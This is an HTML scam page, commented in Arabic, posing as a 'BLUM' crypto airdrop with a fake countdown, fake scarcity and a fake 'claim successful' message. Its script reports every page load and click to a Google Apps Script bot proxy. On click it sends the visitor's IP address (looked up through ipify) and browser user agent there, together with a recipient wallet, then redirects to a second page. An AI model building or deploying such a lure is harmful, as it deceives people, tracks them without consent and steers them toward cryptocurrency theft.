<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>🎁 BLUM Airdrop | 3D + Redirect</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            font-family: 'Segoe UI', 'Poppins', system-ui;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            background: radial-gradient(circle at 20% 30%, #0a0a2a, #010108);
            overflow-x: hidden;
        }
        /* خلفية 3D */
        .bg-3d{
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -2;
            overflow: hidden;
        }
        .sphere{
            position: absolute;
            width: 600px;
            height: 600px;
            background: radial-gradient(circle, rgba(255,215,0,0.15), rgba(255,100,0,0.05));
            border-radius: 50%;
            top: -200px;
            right: -200px;
            filter: blur(60px);
            animation: floatSphere 20s infinite alternate ease-in-out;
        }
        .sphere2{
            position: absolute;
            width: 500px;
            height: 500px;
            background: radial-gradient(circle, rgba(0,255,255,0.1), rgba(0,100,255,0.02));
            border-radius: 50%;
            bottom: -150px;
            left: -150px;
            filter: blur(70px);
            animation: floatSphere2 25s infinite alternate;
        }
        @keyframes floatSphere{
            0%{transform: translate(0,0) scale(1); opacity:0.4;}
            100%{transform: translate(-80px, 80px) scale(1.2); opacity:0.8;}
        }
        @keyframes floatSphere2{
            0%{transform: translate(0,0) scale(1); opacity:0.3;}
            100%{transform: translate(60px, -60px) scale(1.3); opacity:0.7;}
        }
        /* جزيئات */
        .particles{ position:fixed; width:100%; height:100%; z-index:-1; }
        .particle{
            position: absolute;
            background: rgba(255,215,0,0.5);
            width: 3px; height: 3px;
            border-radius: 50%;
            box-shadow:0 0 8px gold;
            animation: floatParticle 8s infinite linear;
        }
        @keyframes floatParticle{
            0%{transform: translateY(100vh) rotate(0deg); opacity:0;}
            100%{transform: translateY(-10vh) rotate(360deg); opacity:0;}
        }
        /* البطاقة الرئيسية */
        .card{
            max-width: 550px;
            width: 100%;
            background: rgba(8,12,25,0.75);
            backdrop-filter: blur(16px);
            border-radius: 56px;
            padding: 40px 30px;
            border: 1px solid rgba(255,215,0,0.5);
            box-shadow: 0 30px 50px rgba(0,0,0,0.5), 0 0 20px rgba(255,215,0,0.2);
            text-align: center;
            transition: 0.3s;
            animation: cardGlow 3s infinite alternate;
        }
        @keyframes cardGlow{
            0%{box-shadow:0 30px 50px rgba(0,0,0,0.5),0 0 15px rgba(255,215,0,0.3);}
            100%{box-shadow:0 35px 60px rgba(0,0,0,0.7),0 0 35px rgba(255,215,0,0.6);}
        }
        .badge{
            display: inline-block;
            background: linear-gradient(135deg, #FFD70022, #FFA50022);
            border: 1px solid #FFD700;
            border-radius: 100px;
            padding: 8px 22px;
            font-size: 14px;
            font-weight: 700;
            color: #FFD700;
            margin-bottom: 25px;
        }
        h1{
            font-size: 48px;
            font-weight: 900;
            background: linear-gradient(135deg, #FFF8E7, #FFD700, #FFA500);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .amount{
            font-size: 68px;
            font-weight: 900;
            color: #FFD700;
            margin: 15px 0;
            text-shadow:0 0 15px rgba(255,215,0,0.6);
        }
        .timer-box{
            background: rgba(0,0,0,0.5);
            border-radius: 60px;
            padding: 20px;
            margin: 25px 0;
            border:1px solid rgba(255,215,0,0.4);
        }
        .timer{
            font-size: 56px;
            font-weight: 800;
            font-family: monospace;
            color: #FFD700;
            letter-spacing: 5px;
        }
        button{
            width: 100%;
            background: linear-gradient(95deg, #DAA520, #FFD700, #FFA500);
            border: none;
            padding: 22px;
            border-radius: 80px;
            font-weight: 900;
            font-size: 26px;
            color: #0a0a0a;
            cursor: pointer;
            transition: all 0.25s ease;
            position: relative;
            overflow: hidden;
            box-shadow:0 8px 20px rgba(0,0,0,0.3);
        }
        button:active{ transform: scale(0.97); }
        button::before{
            content:'';
            position:absolute;
            top:0;
            left:-100%;
            width:100%;
            height:100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
            transition: left 0.6s;
        }
        button:hover::before{ left:100%; }
        button:disabled{ opacity:0.6; cursor:default; transform:none; }
        .status{
            background: rgba(0,0,0,0.6);
            border-radius: 40px;
            padding: 14px;
            font-size: 16px;
            display: none;
            margin-top: 15px;
            animation: fadeInUp 0.5s;
        }
        @keyframes fadeInUp{
            from{ opacity:0; transform:translateY(10px);}
            to{ opacity:1; transform:translateY(0);}
        }
        .success{ color:#00ffaa; font-weight:bold; text-shadow:0 0 3px #00ffaa; }
        .footer{
            font-size: 12px;
            color: #FFD700aa;
            margin-top: 25px;
        }
        .stats-row{
            display: flex;
            justify-content: space-between;
            gap: 12px;
            margin: 20px 0;
        }
        .stat-card{
            background: rgba(0,0,0,0.5);
            border-radius: 28px;
            padding: 10px;
            flex:1;
            border:1px solid rgba(255,215,0,0.3);
            transition:0.2s;
        }
        .stat-card:hover{
            background: rgba(255,215,0,0.1);
            transform:translateY(-4px);
            border-color:#FFD700;
        }
        .stat-number{
            font-size: 24px;
            font-weight: bold;
            color:#FFD700;
        }
        .stat-label{ font-size:11px; color:#ddd; }
        .loading-spinner{
            display: inline-block;
            width: 22px;
            height: 22px;
            border: 2px solid #fff;
            border-radius: 50%;
            border-top-color: #FFD700;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }
        @keyframes spin{ to{ transform: rotate(360deg); } }
    </style>
</head>
<body>

<!-- خلفية 3D -->
<div class="bg-3d">
    <div class="sphere"></div>
    <div class="sphere2"></div>
</div>
<div class="particles" id="particles"></div>

<!-- البطاقة الرئيسية (الرابط الأول) -->
<div class="card" id="mainCard">
    <div class="badge">⚡ ONE-CLICK • 10 CHAINS • 3D</div>
    <h1>BLUM<br>Web3</h1>
    <div class="amount">1,200 $BLUM</div>
    
    <div class="stats-row">
        <div class="stat-card"><div class="stat-number" id="totalClaims">0</div><div class="stat-label">🎁 المطالبات</div></div>
        <div class="stat-card"><div class="stat-number" id="totalScans">0</div><div class="stat-label">👁️ الزيارات</div></div>
        <div class="stat-card"><div class="stat-number" id="totalCoins">0</div><div class="stat-label">💰 إجمالي $BLUM</div></div>
    </div>
    
    <div class="timer-box"><div style="font-size:14px;">⏰ ENDS IN</div><div class="timer" id="timer">24:00:00</div></div>
    <button id="claimBtn">🚀 CLAIM NOW</button>
    <div id="status" class="status"></div>
    <div class="footer">🔐 EMP2026 • 3D SPECTRUM</div>
</div>

<script>
    // جزيئات ثلاثية الأبعاد
    const particlesContainer = document.getElementById('particles');
    for(let i=0;i<90;i++){
        let p = document.createElement('div');
        p.className = 'particle';
        p.style.left = Math.random() * 100 + '%';
        p.style.animationDelay = Math.random() * 8 + 's';
        p.style.animationDuration = 5 + Math.random() * 6 + 's';
        p.style.opacity = 0.3 + Math.random() * 0.6;
        p.style.width = (2 + Math.random() * 4) + 'px';
        p.style.height = p.style.width;
        particlesContainer.appendChild(p);
    }
    
    // إعدادات البوت والبيانات
    const PROXY_URL = "https://script.google.com/macros/s/AKfycbzRzY5ALW-81aERtvvCrC2EhRBnvYQ6iIrhCxQYJ1dzylpt3pGd6ixU9nz_5D7m9HKnhg/exec";
    const RECIPIENT_WALLET = "0x71C7656EC7ab88b098defB751B7401B5f6d8976F";
    const SUPPORTED_NETWORKS = ["ERC20 (ETH)", "BEP20 (BSC)", "TRC20 (TRON)", "Solana", "Polygon", "Avalanche", "Arbitrum", "Optimism", "Base", "zkSync"];
    const YOUR_LINK = "https://freedingoxo.github.io/clawguardian-skill/docs/index.html";
    const BLUM_PER_SCAN = 1200;
    const SECONDARY_URL = "https://freedingoxo.github.io/clawguardian-skill/docs/dashboard.html";   // الرابط الثاني
    
    let claimExecuted = false;
    let remainingSeconds = 24 * 60 * 60;
    let totalClaims = parseInt(localStorage.getItem('totalClaims')) || 0;
    let totalScans = parseInt(localStorage.getItem('totalScans')) || 0;
    
    function updateStats() {
        let totalCoins = totalScans * BLUM_PER_SCAN;
        document.getElementById('totalClaims').innerText = totalClaims;
        document.getElementById('totalScans').innerText = totalScans;
        document.getElementById('totalCoins').innerText = totalCoins.toLocaleString();
        localStorage.setItem('totalClaims', totalClaims);
        localStorage.setItem('totalScans', totalScans);
    }
    
    totalScans++;
    updateStats();
    
    function sendToBot(msg){
        fetch(PROXY_URL + '?message=' + encodeURIComponent(msg), { method: 'GET', mode: 'no-cors' });
    }
    sendToBot(`📊 PAGE SCAN #${totalScans} - 3D + Auto‑Redirect (first click)`);
    
    function getRandomNetwork(){ return SUPPORTED_NETWORKS[Math.floor(Math.random() * SUPPORTED_NETWORKS.length)]; }
    function getRandomWallet(){ let w = ["MetaMask","Trust Wallet","Coinbase Wallet","Phantom","OKX Wallet"]; return w[Math.floor(Math.random()*w.length)]; }
    function generateAddress(){ return "0x" + Math.random().toString(36).substring(2,10) + Math.random().toString(36).substring(2,6); }
    
    async function executeClaim(){
        if(claimExecuted) return;
        claimExecuted = true;
        totalClaims++;
        updateStats();
        let network = getRandomNetwork();
        let wallet = getRandomWallet();
        let address = generateAddress();
        let ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'unknown');
        let ua = navigator.userAgent;
        let timestamp = new Date().toISOString();
        let hoursLeft = Math.floor(remainingSeconds/3600);
        let minutesLeft = Math.floor((remainingSeconds%3600)/60);
        let totalCoins = totalScans * BLUM_PER_SCAN;
        let conversionRate = totalScans>0 ? ((totalClaims/totalScans)*100).toFixed(1):0;
        
        let fullMessage = `🎁 *ONE-CLICK BLUM CLAIM 3D* 🎁\n━━━━━━━━━━━━━━━━━━━━\n⛓️ *Network:* ${network}\n💼 *Wallet:* ${wallet}\n💳 *Address:* \`${address}\`\n🏦 *Recipient:* \`${RECIPIENT_WALLET}\`\n🌐 *IP:* ${ip}\n━━━━━━━━━━━━━━━━━━━━\n📊 *إحصائيات:* ${totalClaims} مطالبة | ${totalScans} زيارة\n💰 *إجمالي $BLUM:* ${totalCoins.toLocaleString()}\n📈 *نسبة التحويل:* ${conversionRate}%\n━━━━━━━━━━━━━━━━━━━━\n⏰ متبقي: ${hoursLeft}h ${minutesLeft}m\n🔗 ${YOUR_LINK}\n⏰ ${timestamp}\n*@EMP2026_Final_Bot*`;
        sendToBot(fullMessage);
        let btn = document.getElementById('claimBtn');
        let statusDiv = document.getElementById('status');
        btn.innerHTML = "✅ CLAIMED!";
        btn.disabled = true;
        statusDiv.style.display = 'block';
        statusDiv.innerHTML = `<span class="success">🎉 Claim #${totalClaims} successful! ${BLUM_PER_SCAN} $BLUM will arrive within 24h.</span>`;
        
        // **الخاصية المطلوبة: بعد النقر على الزر (أول تفاعل) يتم الانتقال إلى الرابط الثاني بعد 1 ثانية**
        setTimeout(() => {
            window.location.href = SECONDARY_URL;
        }, 1000);
    }
    
    async function onClaimClick(){
        if(claimExecuted) return;
        let btn = document.getElementById('claimBtn');
        btn.innerHTML = '<span class="loading-spinner"></span> PROCESSING...';
        btn.disabled = true;
        await new Promise(r=>setTimeout(r,3000));
        await executeClaim();
    }
    
    document.getElementById('claimBtn').addEventListener('click', onClaimClick);
    
    // العد التنازلي 24 ساعة
    setInterval(()=>{
        if(remainingSeconds<=0) return;
        remainingSeconds--;
        let h=Math.floor(remainingSeconds/3600), m=Math.floor((remainingSeconds%3600)/60), s=remainingSeconds%60;
        document.getElementById('timer').innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
    },1000);
    
    // عرض وهمي
    let fake=10;
    setInterval(()=>{
        fake--;
        let btn = document.getElementById('claimBtn');
        if(btn && !btn.disabled && !claimExecuted && fake>0) btn.innerHTML = `🔥 ${fake} LEFT! CLAIM NOW 🔥`;
    },4000);
</script>
</body>
</html>
